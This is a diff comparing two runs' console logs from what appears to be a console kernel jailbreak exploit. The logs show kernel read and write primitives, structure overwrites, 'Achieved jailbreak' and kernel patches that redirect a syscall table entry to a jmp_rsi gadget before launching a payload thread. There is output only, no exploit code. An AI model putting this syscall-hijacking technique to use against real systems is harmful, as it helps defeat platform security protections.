+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105622E50 - value: 0x000000000000000F
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105622DA0 - value: 0xFFFFAEB105628000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1056280B0 - value: 0x0000000000000009
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105628000 - value: 0xFFFFAEB10427CB68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427CC18 - value: 0x0000000000000008
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427CB68 - value: 0xFFFFAEB10427D6D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427D780 - value: 0x0000000000000007
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427D6D0 - value: 0xFFFFAEB10427E238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427E2E8 - value: 0x0000000000000006
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427E238 - value: 0xFFFFAEB10427EDA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427EE50 - value: 0x0000000000000005
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427EDA0 - value: 0xFFFFAEB105274000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1052740B0 - value: 0x0000000000000004
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105274000 - value: 0xFFFFAEB105274B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105274C18 - value: 0x0000000000000003
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105274B68 - value: 0xFFFFAEB1052756D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105275780 - value: 0x0000000000000002
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1052756D0 - value: 0xFFFFAEB104278000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1042780B0 - value: 0x000000000000000E
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB104278000 - value: 0xFFFFAEB104278B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB104278C18 - value: 0x000000000000000D
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB104278B68 - value: 0xFFFFAEB1042796D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB104279780 - value: 0x000000000000000C
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1042796D0 - value: 0xFFFFAEB10427A238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427A2E8 - value: 0x000000000000000B
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427A238 - value: 0xFFFFAEB10427ADA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427AE50 - value: 0x0000000000000001
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427ADA0 - value: 0xFFFFAEB10427C000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427C0B0 - value: 0x000000000000000A
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10427C000 - value: 0xFFFFFFFF97C74E00
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFFFFF97C74EB0 - value: 0x0000000000000000
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C8040 - value: 0xFFFFAEB1070E2200
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFFFFF97C74E40 - value: 0xFFFFAEB10422FA00
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10422FA30 - value: 0xFFFFFFFF97B5A580
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2204 - value: 0x0000000000000000
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2208 - value: 0x0000000000000000
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E220C - value: 0x0000000000000000
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2210 - value: 0x0000000000000001
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2214 - value: 0x0000000000000000
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2218 - value: 0x0000000000000000
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2230 - value: 0xFFFFFFFF97B5A580
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2258 - value: 0x4800000000000007
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2260 - value: 0xFFFFFFFFFFFFFFFF
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2268 - value: 0xFFFFFFFFFFFFFFFF
+[*] kwrite: 1 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1070E2283 - value: 0x0000000000000080
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C8048 - value: 0xFFFFAEB130F42E00
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFFFFF97C74E48 - value: 0xFFFFAEB10422F800
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10422F810 - value: 0xFFFFAEB107164000
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB130F42E10 - value: 0xFFFFAEB107164000
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB130F42E18 - value: 0xFFFFAEB107164000
 [+] Achieved jailbreak !!
 [+] Applying kernal patches...
-[*] sysent_661_addr: 0xFFFFFFFFDC257F00
-[*] jmp_rsi_gadget_addr: 0xFFFFFFFFDB19C7AD
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFFFFFDC257F00 - value: 0x0000000000000004
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFFFFFDC257F08 - value: 0xFFFFFFFFDB560830
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFFFFFDC257F2C - value: 0x0000000000000001
+[*] sysent_661_addr: 0xFFFFFFFF971EBF00
+[*] jmp_rsi_gadget_addr: 0xFFFFFFFF961307AD
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFFFFF971EBF00 - value: 0x0000000000000004
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFFFFF971EBF08 - value: 0xFFFFFFFF964F4830
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFFFFF971EBF2C - value: 0x0000000000000001
 [*] sy_narg: 4
-[*] sy_call: 0xFFFFFFFFDB560830
+[*] sy_call: 0xFFFFFFFF964F4830
 [*] sy_thrcnt: 1
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFFFFFDC257F00 - value: 0x0000000000000002
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFFFFFDC257F08 - value: 0xFFFFFFFFDB19C7AD
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFFFFFDC257F2C - value: 0x0000000000000001
-[*] exec_fd: 0x00000000000000F2
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFFFFF971EBF00 - value: 0x0000000000000002
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFFFFF971EBF08 - value: 0xFFFFFFFF961307AD
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFFFFF971EBF2C - value: 0x0000000000000001
+[*] exec_fd: 0x00000000000003AD
 [*] kexec_ret: 0x0000000000000000
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFFFFFDC257F00 - value: 0x0000000000000004
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFFFFFDC257F08 - value: 0xFFFFFFFFDB560830
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFFFFFDC257F2C - value: 0x0000000000000001
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFFFFF971EBF00 - value: 0x0000000000000004
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFFFFF971EBF08 - value: 0xFFFFFFFF964F4830
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFFFFF971EBF2C - value: 0x0000000000000001
 [+] Kernal patches applied !!
-[*] entry_addr: 0x0000000226080000
-[+] Created bin thread with id 0x0000000000018AEA !!
+[*] entry_addr: 0x00000002266C8000
+[+] Created bin thread with id 0x0000000000018AC1 !!
 [+] ===END===
